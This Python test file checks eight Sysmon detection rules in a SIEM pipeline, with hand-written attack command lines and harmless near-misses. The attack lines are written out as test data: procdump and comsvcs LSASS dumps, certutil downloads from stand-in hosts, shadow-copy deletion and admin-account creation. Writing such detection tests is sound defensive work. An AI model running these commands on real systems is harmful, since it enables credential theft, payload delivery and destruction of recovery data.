"""Sysmon EID 1 process-creation rules (2026-11-21): one per attack stage, each with command-line matching.

    win_powershell_encoded_command   win_lsass_dump_cmdline       win_event_log_cleared_cmdline
    win_service_created_cmdline      win_shadow_copy_deleted      win_scheduled_task_created
    win_certutil_download            win_local_account_created

Loads the REAL rule YAML and feeds it events produced by the REAL sysmon parser (and one windows_eventlog 4688). Per rule:
positive samples (including case variants and parent-any) fire exactly that rule among the eight, near-misses stay
silent, and the alert built by ws4 `make_alert` carries `causal_keys` with the `proc` / `parent` key when the event has a
ParentProcessGuid (ADR-012), and a parent alert's `proc/self` key equals its child alert's `proc/parent` key.
Command lines are hand-written (documented LOLBin / attack forms), not captures. Zero infra.

Run: python services/ws4-detection/test_process_creation_rules.py
"""
from __future__ import annotations

import os
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent.parent
sys.path.insert(0, str(ROOT / "services" / "ws2-normalization"))
sys.path.insert(0, str(ROOT / "services"))
sys.path.insert(0, str(HERE))
os.environ["BUS_BACKEND"] = "memory"
os.environ.pop("FENGARDE_WS1_DIRECT", None)

import main as ws4  # noqa: E402
from causal_alert import build_causal_keys  # noqa: E402
from engine import load_rules  # noqa: E402
from parsers.sysmon import SysmonParser  # noqa: E402
from parsers.windows_eventlog import WindowsEventLogParser  # noqa: E402
from shared import causal_keys as ck  # noqa: E402

RULES_DIR = ROOT / "contracts" / "rules"
FAILS: list[str] = []
SYS, WIN = SysmonParser(), WindowsEventLogParser()
SYSTEM32 = "C:\\Windows\\System32\\"

IDS = {
    "ps_enc": "df8465f8-c959-404a-b7dd-611c7f084ee2",
    "lsass": "c933c309-6991-402e-ad83-332213c30856",
    "evtclear": "cebb9ee4-a72c-48d3-9aad-06b3aff0860c",
    "service": "1abfb057-d081-401d-be13-547958235343",
    "shadow": "d34cce6e-4cb8-4566-a8cf-ee13dc054256",
    "schtask": "976d13c4-7cb5-4b94-be44-1e623af130b9",
    "certutil": "0de0758f-a62c-405b-adcf-fb1d602cd321",
    "account": "f909babc-7b4d-46f3-a2eb-b0ea711fa8c9",
}
NEW_IDS = set(IDS.values())
META = {
    "ps_enc": ("win_powershell_encoded_command", "medium", "T1059.001"),
    "lsass": ("win_lsass_dump_cmdline", "critical", "T1003.001"),
    "evtclear": ("win_event_log_cleared_cmdline", "high", "T1070.001"),
    "service": ("win_service_created_cmdline", "medium", "T1543.003"),
    "shadow": ("win_shadow_copy_deleted", "high", "T1490"),
    "schtask": ("win_scheduled_task_created", "low", "T1053.005"),
    "certutil": ("win_certutil_download", "high", "T1105"),
    "account": ("win_local_account_created", "high", "T1136.001"),
}

PS = SYSTEM32 + "WindowsPowerShell\\v1.0\\powershell.exe"
EXPLORER = "C:\\Windows\\explorer.exe"
WORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"

# (image, command line) per rule: POSITIVES must fire that rule and no other new rule; NEAR_MISSES must fire none.
POSITIVES: dict[str, list[tuple[str, str]]] = {
    "ps_enc": [
        (PS, "powershell.exe -NoP -W Hidden -EncodedCommand JABjAGwAaQBlAG4AdAA="),
        (PS, '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -nop -w hidden -enc SQBFAFgA'),
        (PS, "powershell -ENC SQBFAFgA"),
        (PS, "powershell.exe -e SQBFAFgA"),
        (PS, "powershell.exe -ec SQBFAFgA"),
        (PS, "powershell.exe -EncodedC SQBFAFgA"),
        ("C:\\Program Files\\PowerShell\\7\\pwsh.exe", "pwsh.exe -noprofile -enc SQBFAFgA"),
    ],
    "lsass": [
        ("C:\\Tools\\procdump.exe", "procdump.exe -accepteula -ma lsass.exe C:\\Temp\\l.dmp"),
        ("C:\\Tools\\procdump64.exe", "procdump64.exe /ma lsass.exe l.dmp"),
        ("C:\\Users\\Public\\svchost32.exe", "svchost32.exe -ma lsass.exe d.dmp"),  # renamed procdump still matches
        (SYSTEM32 + "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full"),
        (SYSTEM32 + "rundll32.exe", "rundll32 comsvcs.dll #24 624 C:\\Temp\\l.dmp full"),
        (SYSTEM32 + "rundll32.exe", "RUNDLL32.EXE C:\\WINDOWS\\SYSTEM32\\COMSVCS.DLL,MINIDUMP 624 C:\\T\\l.dmp FULL"),
    ],
    "evtclear": [
        (SYSTEM32 + "wevtutil.exe", "wevtutil.exe cl Security"),
        (SYSTEM32 + "wevtutil.exe", "WEVTUTIL.EXE CL System"),
        (SYSTEM32 + "wevtutil.exe", "wevtutil clear-log Application"),
        (PS, 'powershell.exe -Command "Clear-EventLog -LogName Security"'),
        (PS, "powershell.exe -c Clear-EventLog Application,System"),
    ],
    "service": [
        (SYSTEM32 + "sc.exe", 'sc.exe create evilsvc binPath= "C:\\Temp\\x.exe"'),
        (SYSTEM32 + "sc.exe", "sc \\\\srv01 create evilsvc binpath= c:\\x.exe start= auto"),
        (SYSTEM32 + "sc.exe", "SC.EXE CREATE Evil BINPATH= C:\\x.exe"),
    ],
    "shadow": [
        (SYSTEM32 + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
        (SYSTEM32 + "vssadmin.exe", "VSSADMIN Delete Shadows /For=C: /Oldest"),
        (SYSTEM32 + "vssadmin.exe", "vssadmin delete shadowstorage /for=C: /on=C:"),
        (SYSTEM32 + "wbem\\WMIC.exe", "wmic shadowcopy delete"),
        (SYSTEM32 + "wbem\\WMIC.exe", "wmic.exe /namespace:\\\\root\\cimv2 path win32_shadowcopy delete"),
        (SYSTEM32 + "bcdedit.exe", "bcdedit /set {default} recoveryenabled no"),
        (SYSTEM32 + "bcdedit.exe", "BCDEDIT.EXE /SET {DEFAULT} RECOVERYENABLED NO"),
    ],
    "schtask": [
        (SYSTEM32 + "schtasks.exe", "schtasks /create /tn Upd /tr C:\\Temp\\u.exe /sc onlogon"),
        (SYSTEM32 + "schtasks.exe", "SCHTASKS.EXE /Create /S srv01 /TN x /TR c:\\x.exe /SC daily"),
        (SYSTEM32 + "schtasks.exe", "schtasks -create /tn x /tr c:\\x.exe /sc daily"),
    ],
    "certutil": [
        (SYSTEM32 + "certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe C:\\Temp\\a.exe"),
        (SYSTEM32 + "certutil.exe", "CERTUTIL -URLCACHE -F https://evil.example/a.dll a.dll"),
        (SYSTEM32 + "certutil.exe", "certutil /urlcache /split /f http://203.0.113.9/a.exe a.exe"),
        (SYSTEM32 + "certutil.exe", "certutil -verifyctl -f -split http://203.0.113.9/a.sst"),
        (SYSTEM32 + "certutil.exe", "certutil -urlcache -f ftp://203.0.113.9/a.exe a.exe"),
    ],
    "account": [
        (SYSTEM32 + "net.exe", "net user svc_bk Passw0rd! /add"),
        (SYSTEM32 + "net1.exe", "net1 user hacker P@ss /ADD"),
        (SYSTEM32 + "net.exe", "net user svc_bk Passw0rd! /add /domain"),
        (SYSTEM32 + "net.exe", "net.exe localgroup administrators svc_bk /add"),
        (SYSTEM32 + "net.exe", 'net localgroup "Administrators" svc_bk /add'),
    ],
}

NEAR_MISSES: dict[str, list[tuple[str, str]]] = {
    "ps_enc": [
        (PS, "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1"),
        (PS, 'powershell.exe -Command "Get-Content a.txt -Encoding UTF8"'),  # -Encoding is not -EncodedCommand
        (PS, "powershell.exe -NoProfile -Command Get-Date"),
        (PS, "powershell.exe -ExecutionPolicy Bypass -NoLogo -Version 5.1"),  # -Ex... is not an encoded switch
        (SYSTEM32 + "cmd.exe", "cmd.exe /c echo -enc SQBFAFgA"),  # right text, not a PowerShell image
        ("C:\\Temp\\notpowershell.exe", "notpowershell.exe -enc SQBFAFgA"),  # basename must equal, not end with
    ],
    "lsass": [
        ("C:\\Tools\\procdump.exe", "procdump.exe -accepteula -ma notepad.exe n.dmp"),  # -ma without lsass
        (SYSTEM32 + "tasklist.exe", 'tasklist /fi "imagename eq lsass.exe"'),  # lsass without -ma
        (SYSTEM32 + "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,DllRegisterServer"),
        (SYSTEM32 + "rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL"),
        ("C:\\Windows\\notepad.exe", "notepad.exe comsvcs.dll minidump"),  # not rundll32
    ],
    "evtclear": [
        (SYSTEM32 + "wevtutil.exe", "wevtutil.exe qe Security /c:5 /f:text"),
        (SYSTEM32 + "wevtutil.exe", "wevtutil el"),
        (SYSTEM32 + "wevtutil.exe", "wevtutil gl Security"),
        (PS, "powershell.exe -Command Get-EventLog -LogName Security -Newest 5"),
        (SYSTEM32 + "cmd.exe", "cmd.exe /c wevtutil cl Security"),  # the wevtutil CHILD fires, not the cmd wrapper
    ],
    "service": [
        (SYSTEM32 + "sc.exe", "sc.exe query"),
        (SYSTEM32 + "sc.exe", "sc.exe config Spooler start= auto"),
        (SYSTEM32 + "sc.exe", "sc.exe start Spooler"),
        (SYSTEM32 + "sc.exe", "sc.exe delete evilsvc"),
        (SYSTEM32 + "sc.exe", "sc.exe create evilsvc"),  # create with no binPath
        ("C:\\Temp\\notsc.exe", "notsc.exe create x binPath= y"),
    ],
    "shadow": [
        (SYSTEM32 + "vssadmin.exe", "vssadmin.exe list shadows"),
        (SYSTEM32 + "vssadmin.exe", "vssadmin.exe create shadow /for=C:"),
        (SYSTEM32 + "wbem\\WMIC.exe", "wmic shadowcopy call create Volume=C:\\"),
        (SYSTEM32 + "wbem\\WMIC.exe", "wmic process list brief"),
        (SYSTEM32 + "bcdedit.exe", "bcdedit /enum"),
        (SYSTEM32 + "bcdedit.exe", "bcdedit /set {default} recoveryenabled yes"),
        (SYSTEM32 + "bcdedit.exe", "bcdedit /set {default} bootstatuspolicy ignoreallfailures"),
        (SYSTEM32 + "cmd.exe", "cmd.exe /c vssadmin delete shadows /all"),  # the vssadmin CHILD fires, not cmd
    ],
    "schtask": [
        (SYSTEM32 + "schtasks.exe", "schtasks /query /fo LIST"),
        (SYSTEM32 + "schtasks.exe", "schtasks /run /tn Upd"),
        (SYSTEM32 + "schtasks.exe", "schtasks /delete /tn Upd /f"),
        (SYSTEM32 + "schtasks.exe", "schtasks /change /tn Upd /disable"),
        ("C:\\Temp\\notschtasks.exe", "notschtasks.exe /create /tn x"),
    ],
    "certutil": [
        (SYSTEM32 + "certutil.exe", "certutil.exe -urlcache * delete"),  # cache cleanup, no URL
        (SYSTEM32 + "certutil.exe", "certutil -hashfile a.exe SHA256"),
        (SYSTEM32 + "certutil.exe", "certutil -decode a.b64 a.exe"),
        (SYSTEM32 + "certutil.exe", "certutil -addstore -f root C:\\ca.cer"),  # -f and a path, no download switch
        (SYSTEM32 + "curl.exe", "curl.exe -urlcache http://203.0.113.9/a.exe"),  # right text, not certutil
    ],
    "account": [
        (SYSTEM32 + "net.exe", "net user"),
        (SYSTEM32 + "net.exe", "net user svc_bk /delete"),
        (SYSTEM32 + "net.exe", "net user svc_bk /active:yes"),
        (SYSTEM32 + "net.exe", 'net localgroup "Remote Desktop Users" bob /add'),  # another group
        (SYSTEM32 + "net.exe", "net localgroup administrators"),  # listing
        (SYSTEM32 + "net.exe", "net use \\\\srv\\share"),
        ("C:\\Temp\\notnet.exe", "notnet.exe user x /add"),
    ],
}


def check(cond, msg):
    if not cond:
        FAILS.append(msg)


def guid(n: int) -> str:
    return "{5e2f1a7c-0000-6a2f-0000-%012x}" % n


def sysmon(image, cmd, n=1, parent_image=EXPLORER, own=True, parent=True, host="wks-jdoe"):
    rec = {"EventID": 1, "TimeCreated": 1750000000000 + n, "Computer": host, "User": "CORP\\jdoe",
           "Image": image, "CommandLine": cmd, "ProcessId": str(4000 + n), "ParentImage": parent_image,
           "ParentProcessId": "800"}
    if own:
        rec["ProcessGuid"] = guid(n)
    if parent:
        rec["ParentProcessGuid"] = guid(0x320)
    ev = SYS.parse({"source_type": "sysmon", "raw": rec, "meta": {"ingest_id": f"pc-{n}"}})
    assert ev is not None
    return ev


def new_rules():
    return {r.id: r for r in load_rules(RULES_DIR) if r.id in NEW_IDS}


def fired_new(rules, ev):
    return {k for k, rid in IDS.items() if rules[rid].evaluate(ev)}


def alert_for(det, ev, rule_id):
    ev, matched, _ = det.process(ev)
    mine = [r for r in matched if r.id == rule_id]
    check(len(mine) == 1, f"detector must match {rule_id} exactly once, matched {[r.id for r in matched]}")
    return ws4.make_alert(ev, mine[0], ev["siem"].get("score", 0)) if mine else {}


def run():
    rules = new_rules()
    check(len(rules) == 8, f"all 8 new rules must load, got {len(rules)}")
    titles = [r.title for r in rules.values()]
    check(len(set(titles)) == 8, "titles must be unique")
    for key, (stem, level, tech) in META.items():
        r = rules[IDS[key]]
        check(not r.stateful, f"{key}: single-event rule, not stateful")
        check(r.level == level, f"{key}: level {r.level!r} != {level!r}")
        text = (RULES_DIR / f"{stem}.yml").read_text(encoding="utf-8")
        check(f"technique: {tech}" in text and f"id: {IDS[key]}" in text, f"{key}: {stem}.yml id/technique")

    n = 100
    for key, samples in POSITIVES.items():
        for image, cmd in samples:
            n += 1
            for parent_image in (EXPLORER, WORD):  # parent is any
                got = fired_new(rules, sysmon(image, cmd, n, parent_image))
                check(got == {key}, f"{key}: {cmd!r} (parent {parent_image.rsplit(chr(92), 1)[-1]}) fired {sorted(got)}")
    for key, samples in NEAR_MISSES.items():
        for image, cmd in samples:
            n += 1
            got = fired_new(rules, sysmon(image, cmd, n))
            check(not got, f"{key} near-miss {cmd!r} must stay silent, fired {sorted(got)}")

    # No command line / no image: nothing can match (fail closed), never raises.
    bare = SYS.parse({"source_type": "sysmon", "meta": {"ingest_id": "pc-bare"},
                      "raw": {"EventID": 1, "TimeCreated": 1750000000000, "Computer": "wks-jdoe"}})
    check(bare is not None and not fired_new(rules, bare), "event with no image / command line must stay silent")
    # Other Sysmon EIDs and other classes never match (class 1002 activity 1 only).
    ev3 = SYS.parse({"source_type": "sysmon", "meta": {"ingest_id": "pc-eid3"},
                     "raw": {"EventID": 3, "TimeCreated": 1750000000000, "Computer": "wks-jdoe", "Image": PS,
                             "CommandLine": "powershell -enc SQBFAFgA", "DestinationIp": "203.0.113.9"}})
    check(ev3 is not None and not fired_new(rules, ev3), "EID 3 must not match even with a matching command line")
    ev5 = SYS.parse({"source_type": "sysmon", "meta": {"ingest_id": "pc-eid5"},
                     "raw": {"EventID": 5, "TimeCreated": 1750000000000, "Computer": "wks-jdoe", "Image": PS,
                             "CommandLine": "powershell -enc SQBFAFgA"}})
    check(ev5 is not None and not fired_new(rules, ev5), "EID 5 (terminate) must not match")

    # Windows 4688 with command-line auditing carries the same fields, so the rules fire there too (no GUID -> no keys).
    w = WIN.parse({"source_type": "windows_eventlog", "meta": {"ingest_id": "pc-4688"},
                   "raw": {"EventID": 4688, "TimeCreated": 1750000000000, "Computer": "wks-jdoe",
                           "SubjectUserName": "jdoe", "NewProcessName": PS, "ParentProcessName": EXPLORER,
                           "CommandLine": "powershell.exe -enc SQBFAFgA"}})
    check(w is not None and fired_new(rules, w) == {"ps_enc"}, "4688 with a command line must fire win_powershell_encoded_command")
    check(w is not None and build_causal_keys(w) == [], "4688 carries no process GUID: no causal keys")

    # ADR-012: the alert's causal_keys come from the trigger event; one alert per process creation.
    det = ws4.Detector()
    for key, samples in POSITIVES.items():
        image, cmd = samples[0]
        n += 1
        ev = sysmon(image, cmd, n)
        direct = build_causal_keys(ev)
        a = alert_for(det, ev, IDS[key])
        ks = a.get("causal_keys") or []
        tenant = ev["siem"].get("tenant") or "default"
        want_self = ck.key_hash(tenant, "proc", "", "wks-jdoe", ck.canon_guid(guid(n)))
        want_parent = ck.key_hash(tenant, "proc", "", "wks-jdoe", ck.canon_guid(guid(0x320)))
        check(ks == direct, f"{key}: alert causal_keys must equal build_causal_keys(trigger event)")
        check(any(k["ns"] == "proc" and k["role"] == "parent" and k["h"] == want_parent for k in ks),
              f"{key}: alert must carry the proc parent key for ParentProcessGuid, got {ks!r}")
        check(any(k["ns"] == "proc" and k["role"] == "self" and k["h"] == want_self for k in ks),
              f"{key}: alert must carry the proc self key, got {ks!r}")
        check(all(k["scope_trust"] == "asserted" for k in ks), f"{key}: scope_trust asserted (ws1 not declared direct)")
        check(a.get("rule_id") == IDS[key] and a.get("alert_id"), f"{key}: alert shape")

        # no ParentProcessGuid -> still alerts, no parent key; no ProcessGuid either -> no proc keys at all
        n += 1
        a2 = alert_for(det, sysmon(image, cmd, n, parent=False), IDS[key])
        roles = {(k["ns"], k["role"]) for k in a2.get("causal_keys") or []}
        check(roles == {("proc", "self")}, f"{key}: without ParentProcessGuid only proc/self expected, got {roles}")
        n += 1
        a3 = alert_for(det, sysmon(image, cmd, n, own=False, parent=False), IDS[key])
        check("causal_keys" not in a3, f"{key}: no GUIDs -> no causal_keys")

    # The point of the rules: a parent alert and its direct child alert join on the key. Parent = encoded PowerShell,
    # child = certutil it spawned (ParentProcessGuid = the PowerShell ProcessGuid).
    parent_ev = sysmon(PS, "powershell.exe -enc SQBFAFgA", 900, parent=False)
    child_rec = {"EventID": 1, "TimeCreated": 1750000000900, "Computer": "wks-jdoe", "User": "CORP\\jdoe",
                 "Image": SYSTEM32 + "certutil.exe", "ProcessId": "4900", "ProcessGuid": guid(901),
                 "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe a.exe",
                 "ParentImage": PS, "ParentProcessId": "4900", "ParentProcessGuid": guid(900)}
    child_ev = SYS.parse({"source_type": "sysmon", "raw": child_rec, "meta": {"ingest_id": "pc-child"}})
    assert child_ev is not None
    pa = alert_for(det, parent_ev, IDS["ps_enc"])
    ca = alert_for(det, child_ev, IDS["certutil"])
    p_self = [k["h"] for k in pa.get("causal_keys") or [] if (k["ns"], k["role"]) == ("proc", "self")]
    c_parent = [k["h"] for k in ca.get("causal_keys") or [] if (k["ns"], k["role"]) == ("proc", "parent")]
    check(len(p_self) == 1 and p_self == c_parent, "parent alert proc/self key must equal child alert proc/parent key")
    check(pa["alert_id"] != ca["alert_id"], "parent and child are two distinct alerts")
    # redelivery of the same event yields the same alert id (alert id is per ingest_id for a single-event rule)
    check(alert_for(det, child_ev, IDS["certutil"])["alert_id"] == ca["alert_id"], "redelivery: same alert_id")


run()
if FAILS:
    print("[FAIL] process-creation rule tests:")
    for f in FAILS:
        print("  -", f)
    sys.exit(1)
print("[OK] ws4 process-creation rules (8 rules; positives, near-misses, causal keys) PASS")
